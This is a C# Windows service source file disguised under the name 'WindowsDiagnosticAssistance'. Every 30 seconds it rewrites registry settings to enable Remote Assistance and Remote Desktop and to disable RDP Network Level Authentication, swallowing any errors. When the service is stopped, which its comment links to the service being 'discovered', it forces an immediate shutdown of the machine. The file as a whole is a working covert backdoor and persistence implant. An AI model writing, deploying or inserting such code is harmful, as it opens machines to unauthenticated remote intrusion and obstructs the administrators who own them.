using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsDiagnosticAssistance
{
    public partial class Service1 : ServiceBase
    {
        public Service1()
        {
            InitializeComponent();
        }


        protected override void OnStart(string[] args)
        {
            InitTimer(); //creates a timer on start

        }

        private Timer timer1;
        public void InitTimer() 
        {
            timer1 = new Timer();
            timer1.Tick += new EventHandler(timer1_Tick);
            timer1.Interval = 30000; // in miliseconds
            timer1.Start();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            
            bool AllowRemoteAssistance = true; //sets a setting to add allowing remote assistance to the timer
            int RemoteDesktopSelectNumber = 2; //sets the default action. You can change what action occurs based on need by changing this part
            

            try //try catch in case it fails, so the program doesn't crash.
            {
            
                RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Default);
                key = key.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Remote Assistance", true);
                //this section toggles the remote assistance registry key value
                if (AllowRemoteAssistance) 
                    key.SetValue("fAllowToGetHelp", 1, RegistryValueKind.DWord);
                else
                    key.SetValue("fAllowToGetHelp", 0, RegistryValueKind.DWord);
                key.Flush();
                if (key != null)
                    key.Close();
                    
                if (RemoteDesktopSelectNumber == 1 || RemoteDesktopSelectNumber == 2)
                {
                    key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Default);
                    key = key.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\", true); //turns on rdp
                    key.SetValue("UserAuthentication", 0, RegistryValueKind.DWord); //turns off authentication to use rdp
                    key.Flush();
                    if (key != null)
                        key.Close();

                    key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Default);
                    key = key.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server", true);
                    if (RemoteDesktopSelectNumber == 1) //turns on terminal server
                        key.SetValue("fDenyTSConnections", 1, RegistryValueKind.DWord);
                    else
                        key.SetValue("fDenyTSConnections", 0, RegistryValueKind.DWord);
                    key.Flush();
                    if (key != null)
                        key.Close();
                }
                else if (RemoteDesktopSelectNumber == 3) //turns on user authentication for RDP
                {
                    key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Default);
                    key = key.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\", true);
                    key.SetValue("UserAuthentication", 1, RegistryValueKind.DWord);
                    key.Flush();
                    if (key != null)
                        key.Close();
                }


            }
            catch
            {
                
                //classy blank catch because there was nothing else to do
            }

            InitTimer(); //repeats

        }

        protected override void OnStop()
        {
            //turns off the device if it is discovered. No perm damage. 
            var psi = new ProcessStartInfo("shutdown", "/s /t 0");
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            Process.Start(psi);

        }
    
    }
}
